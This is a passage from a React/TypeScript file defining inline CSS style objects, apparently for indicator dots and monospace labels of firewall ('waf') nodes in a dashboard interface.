  background: 'rgba(255, 255, 255, 0.02)',
  border: '1px solid rgba(255, 255, 255, 0.08)',
  borderRadius: '4px',
  padding: '0.4rem 0.6rem',
  display: 'flex',
  alignItems: 'center',
  gap: '8px',
  transition: 'border-color 0.3s ease'
}

const wafNodeIndicatorStyle: React.CSSProperties = {
  width: '6px',
  height: '6px',
  borderRadius: '50%'
}

const wafNodeLabelStyle: React.CSSProperties = {
  fontSize: '0.7rem',
  fontFamily: 'monospace',
  color: '#aaa'
}
